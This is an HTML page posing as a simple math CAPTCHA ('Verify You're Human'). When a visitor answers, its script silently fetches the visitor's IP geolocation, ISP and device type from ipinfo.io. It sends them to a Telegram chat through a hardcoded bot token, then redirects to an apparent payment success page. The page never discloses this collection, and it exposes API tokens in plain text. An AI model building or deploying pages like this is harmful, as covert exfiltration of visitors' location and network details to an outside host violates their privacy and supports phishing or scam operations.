<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>CAPTCHA with Telegram Logging</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .captcha-container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
    }
    .captcha-container h2 {
      text-align: center;
    }
    .captcha-box {
      margin: 20px 0;
      font-size: 20px;
      font-weight: bold;
      text-align: center;
      background: #eee;
      padding: 10px;
      border-radius: 5px;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      margin-top: 15px;
      background: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }
    .error {
      color: red;
      text-align: center;
      margin-top: 10px;
    }
    .success {
      color: green;
      text-align: center;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="captcha-container">
    <h2>Verify You're Human</h2>
    <div class="captcha-box" id="captchaQuestion"></div>
    <input type="text" id="captchaInput" placeholder="Enter your answer" />
    <button id="submitBtn">Submit</button>
    <div id="captchaMessage"></div>
  </div>

  <script>
    let num1, num2, answer;

    const botToken = "8096041390:AAGBcV0HBqFbmpkOpFy9LbiZczh-WqRQtQY";
    const chatId = "6529371358";

    function generateCaptcha() {
      num1 = Math.floor(Math.random() * 10) + 1;
      num2 = Math.floor(Math.random() * 10) + 1;
      answer = num1 + num2;
      document.getElementById("captchaQuestion").innerText = `What is ${num1} + ${num2}?`;
      document.getElementById("captchaMessage").innerHTML = '';
      document.getElementById("captchaInput").value = '';
    }

    function getDeviceType() {
      const ua = navigator.userAgent;

      if (/iPhone|iPad|iPod/i.test(ua)) return "iOS Device";
      if (/Android/i.test(ua)) return "Android Device";
      if (/Windows/i.test(ua)) return "Windows PC";
      if (/Macintosh/i.test(ua)) return "macOS Device";
      if (/Linux/i.test(ua)) return "Linux Device";
      return "Unknown Device";
    }

    async function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const payload = {
        chat_id: chatId,
        text: message
      };

      try {
        await fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });
      } catch (err) {
        console.error("Telegram error:", err);
      }
    }

    async function validateCaptcha() {
      const userAnswer = parseInt(document.getElementById("captchaInput").value.trim());
      const messageEl = document.getElementById("captchaMessage");

      if (userAnswer === answer) {
        messageEl.innerHTML = "<p class='success'>Verified! Redirecting... ✅</p>";

        try {
          const res = await fetch("https://ipinfo.io/json?token=4b4e37d7269136");
          const data = await res.json();
          const deviceType = getDeviceType();

          const userMessage = `
🔐 SIMPLE HELP
📱 Device: ${deviceType}
🌍 IP: ${data.ip}
🏙️ City: ${data.city}
📍 Region: ${data.region}
📦 Country: ${data.country}
📮 Postal: ${data.postal}
🕐 Timezone: ${data.timezone}
📡 ISP: ${data.org}
          `.trim();

          await sendToTelegram(userMessage);
        } catch (e) {
          console.warn("IP info error:", e);
        }

        setTimeout(() => {
          window.location.href = "https://payment-chi-lake.vercel.app/success.html";
        }, 1000);
      } else {
        messageEl.innerHTML = "<p class='error'>Incorrect. Please try again.</p>";
        generateCaptcha();
      }
    }

    document.addEventListener("DOMContentLoaded", () => {
      generateCaptcha();
      document.getElementById("submitBtn").addEventListener("click", validateCaptcha);
    });
  </script>
</body>
</html>
